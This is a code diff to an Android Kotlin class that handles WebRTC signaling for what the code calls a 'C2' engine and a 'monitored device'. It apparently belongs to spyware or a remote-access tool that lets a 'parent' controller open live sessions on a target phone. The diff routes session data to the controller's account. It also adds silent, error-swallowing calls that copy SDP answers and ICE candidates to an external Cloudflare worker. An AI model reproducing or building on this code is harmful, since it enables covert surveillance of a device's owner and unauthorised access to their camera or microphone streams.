@@ -24,6 +24,7 @@ class FirebaseSignalingRepository(
 
     companion object {
         private const val TAG = "FirebaseSignaling"
+        private const val CLOUDFLARE_WORKER_URL = "https://webrtc.johnduck99.workers.dev"
     }
 
     interface SignalingCallback {
@@ -58,7 +59,7 @@ class FirebaseSignalingRepository(
                     if (!uid.isNullOrBlank()) {
                         val parentUid = firebaseEngine.getParentUserId()
                         val account = firebaseEngine.getActiveAccount()
-                        val devId = firebaseEngine.currentDeviceId.ifBlank { "DEV_MONITORED_DEVICE" }
+                        val devId = DeviceIdProvider.getDeviceId(context)
 
                         val url = "${account.databaseUrl}/users/$parentUid/devices/$devId/webrtc_signaling/sessions.json"
                         val request = firebaseEngine.buildAuthenticatedRequest(url, "GET")
@@ -92,12 +93,12 @@ class FirebaseSignalingRepository(
 
                                             if (sessId == activeSessionId) {
                                                 if (offer != null && offer.has("sdp") && !sessObj.optBoolean("offerProcessed", false)) {
-                                                    markOfferProcessed(account, uid, devId, sessId)
+                                                    markOfferProcessed(account, parentUid, devId, sessId)
                                                     callback?.onOfferReceived(offer.getString("sdp"))
                                                 }
 
                                                 if (answer != null && answer.has("sdp") && !sessObj.optBoolean("answerProcessed", false)) {
-                                                    markAnswerProcessed(account, uid, devId, sessId)
+                                                    markAnswerProcessed(account, parentUid, devId, sessId)
                                                     callback?.onAnswerReceived(answer.getString("sdp"))
                                                 }
 
@@ -108,7 +109,7 @@ class FirebaseSignalingRepository(
                                                         val cObj = candidates.optJSONObject(cKey) ?: continue
                                                         val sender = cObj.optString("sender", "")
                                                         if (sender != "ANDROID" && !cObj.optBoolean("processed", false)) {
-                                                            markCandidateProcessed(account, uid, devId, sessId, cKey)
+                                                            markCandidateProcessed(account, parentUid, devId, sessId, cKey)
                                                             callback?.onIceCandidateReceived(cObj)
                                                         }
                                                     }
@@ -137,11 +138,12 @@ class FirebaseSignalingRepository(
     fun postAcceptSession(sessionId: String) {
         scope.launch {
             try {
-                val uid = firebaseEngine.refreshUserIdentity() ?: return@launch
+                firebaseEngine.refreshUserIdentity() ?: return@launch
+                val parentUid = firebaseEngine.getParentUserId()
                 val account = firebaseEngine.getActiveAccount()
-                val devId = firebaseEngine.currentDeviceId.ifBlank { "DEV_MONITORED_DEVICE" }
+                val devId = DeviceIdProvider.getDeviceId(context)
 
-                val url = "${account.databaseUrl}/users/$uid/devices/$devId/webrtc_signaling/sessions/$sessionId/status.json"
+                val url = "${account.databaseUrl}/users/$parentUid/devices/$devId/webrtc_signaling/sessions/$sessionId/status.json"
                 val body = "\"ACCEPTED\"".toRequestBody("application/json".toMediaTypeOrNull())
                 val request = firebaseEngine.buildAuthenticatedRequest(url, "PUT", body) ?: return@launch
                 httpClient.newCall(request).execute().close()
@@ -154,11 +156,12 @@ class FirebaseSignalingRepository(
     fun postSdpOffer(sessionId: String, sdp: String) {
         scope.launch {
             try {
-                val uid = firebaseEngine.refreshUserIdentity() ?: return@launch
+                firebaseEngine.refreshUserIdentity() ?: return@launch
+                val parentUid = firebaseEngine.getParentUserId()
                 val account = firebaseEngine.getActiveAccount()
-                val devId = firebaseEngine.currentDeviceId.ifBlank { "DEV_MONITORED_DEVICE" }
+                val devId = DeviceIdProvider.getDeviceId(context)
 
-                val url = "${account.databaseUrl}/users/$uid/devices/$devId/webrtc_signaling/sessions/$sessionId/offer.json"
+                val url = "${account.databaseUrl}/users/$parentUid/devices/$devId/webrtc_signaling/sessions/$sessionId/offer.json"
                 val offerJson = JSONObject().apply {
                     put("type", "offer")
                     put("sdp", sdp)
@@ -176,11 +179,12 @@ class FirebaseSignalingRepository(
     fun postSdpAnswer(sessionId: String, sdp: String) {
         scope.launch {
             try {
-                val uid = firebaseEngine.refreshUserIdentity() ?: return@launch
+                firebaseEngine.refreshUserIdentity() ?: return@launch
+                val parentUid = firebaseEngine.getParentUserId()
                 val account = firebaseEngine.getActiveAccount()
-                val devId = firebaseEngine.currentDeviceId.ifBlank { "DEV_MONITORED_DEVICE" }
+                val devId = DeviceIdProvider.getDeviceId(context)
 
-                val url = "${account.databaseUrl}/users/$uid/devices/$devId/webrtc_signaling/sessions/$sessionId/answer.json"
+                val url = "${account.databaseUrl}/users/$parentUid/devices/$devId/webrtc_signaling/sessions/$sessionId/answer.json"
                 val answerJson = JSONObject().apply {
                     put("type", "answer")
                     put("sdp", sdp)
@@ -189,6 +193,19 @@ class FirebaseSignalingRepository(
                 val body = answerJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
                 val request = firebaseEngine.buildAuthenticatedRequest(url, "PUT", body) ?: return@launch
                 httpClient.newCall(request).execute().close()
+
+                try {
+                    val cfJson = JSONObject().apply {
+                        put("deviceId", devId)
+                        put("sessionId", sessionId)
+                        put("sdp", sdp)
+                    }
+                    val cfReq = okhttp3.Request.Builder()
+                        .url("$CLOUDFLARE_WORKER_URL/api/webrtc/answer")
+                        .post(cfJson.toString().toRequestBody("application/json".toMediaTypeOrNull()))
+                        .build()
+                    httpClient.newCall(cfReq).execute().close()
+                } catch (_: Exception) {}
             } catch (e: Exception) {
                 Log.e(TAG, "postSdpAnswer error: ${e.message}")
             }
@@ -198,11 +215,12 @@ class FirebaseSignalingRepository(
     fun postIceCandidate(sessionId: String, candidate: String, sdpMid: String, sdpMLineIndex: Int) {
         scope.launch {
             try {
-                val uid = firebaseEngine.refreshUserIdentity() ?: return@launch
+                firebaseEngine.refreshUserIdentity() ?: return@launch
+                val parentUid = firebaseEngine.getParentUserId()
                 val account = firebaseEngine.getActiveAccount()
-                val devId = firebaseEngine.currentDeviceId.ifBlank { "DEV_MONITORED_DEVICE" }
+                val devId = DeviceIdProvider.getDeviceId(context)
 
-                val url = "${account.databaseUrl}/users/$uid/devices/$devId/webrtc_signaling/sessions/$sessionId/candidates.json"
+                val url = "${account.databaseUrl}/users/$parentUid/devices/$devId/webrtc_signaling/sessions/$sessionId/candidates.json"
                 val candJson = JSONObject().apply {
                     put("sender", "ANDROID")
                     put("candidate", candidate)
@@ -213,33 +231,49 @@ class FirebaseSignalingRepository(
                 val body = candJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
                 val request = firebaseEngine.buildAuthenticatedRequest(url, "POST", body) ?: return@launch
                 httpClient.newCall(request).execute().close()
+
+                try {
+                    val cfCand = JSONObject().apply {
+                        put("deviceId", devId)
+                        put("sessionId", sessionId)
+                        put("sender", "ANDROID")
+                        put("candidate", candidate)
+                        put("sdpMid", sdpMid)
+                        put("sdpMLineIndex", sdpMLineIndex)
+                    }
+                    val cfReq = okhttp3.Request.Builder()
+                        .url("$CLOUDFLARE_WORKER_URL/api/webrtc/candidate")
+                        .post(cfCand.toString().toRequestBody("application/json".toMediaTypeOrNull()))
+                        .build()
+                    httpClient.newCall(cfReq).execute().close()
+                } catch (_: Exception) {}
             } catch (e: Exception) {
                 Log.e(TAG, "postIceCandidate error: ${e.message}")
             }
         }
     }
 
-    private fun markOfferProcessed(account: FirebaseC2Engine.FirebaseAccountConfig, uid: String, devId: String, sessId: String) {
+    private fun markOfferProcessed(account: FirebaseC2Engine.FirebaseAccountConfig, parentUid: String, devId: String, sessId: String) {
         try {
-            val url = "${account.databaseUrl}/users/$uid/devices/$devId/webrtc_signaling/sessions/$sessId/offerProcessed.json"
+            val url = "${account.databaseUrl}/users/$parentUid/devices/$devId/webrtc_signaling/sessions/$sessId/offerProcessed.json"
             val body = "true".toRequestBody("application/json".toMediaTypeOrNull())
             val request = firebaseEngine.buildAuthenticatedRequest(url, "PUT", body) ?: return
             httpClient.newCall(request).execute().close()
         } catch (_: Exception) {}
     }
 
-    private fun markAnswerProcessed(account: FirebaseC2Engine.FirebaseAccountConfig, uid: String, devId: String, sessId: String) {
+    private fun markAnswerProcessed(account: FirebaseC2Engine.FirebaseAccountConfig, parentUid: String, devId: String, sessId: String) {
         try {
-            val url = "${account.databaseUrl}/users/$uid/devices/$devId/webrtc_signaling/sessions/$sessId/answerProcessed.json"
+            val url = "${account.databaseUrl}/users/$parentUid/devices/$devId/webrtc_signaling/sessions/$sessId/answerProcessed.json"
             val body = "true".toRequestBody("application/json".toMediaTypeOrNull())
             val request = firebaseEngine.buildAuthenticatedRequest(url, "PUT", body) ?: return
             httpClient.newCall(request).execute().close()
         } catch (_: Exception) {}
     }
 
-    private fun markCandidateProcessed(account: FirebaseC2Engine.FirebaseAccountConfig, uid: String, devId: String, sessId: String, candKey: String) {
+    private fun markCandidateProcessed(account: FirebaseC2Engine.FirebaseAccountConfig, parentUid: String, devId: String, sessId: String, candKey: String) {
         try {
-            val url = "${account.databaseUrl}/users/$uid/devices/$devId/webrtc_signaling/sessions/$sessId/candidates/$candKey/processed.json"
+            val url = "${account.databaseUrl}/users/$parentUid/devices/$devId/webrtc_signaling/sessions/$sessId/candidates/$candKey/processed.json"
             val body = "true".toRequestBody("application/json".toMediaTypeOrNull())
             val request = firebaseEngine.buildAuthenticatedRequest(url, "PUT", body) ?: return
             httpClient.newCall(request).execute().close()
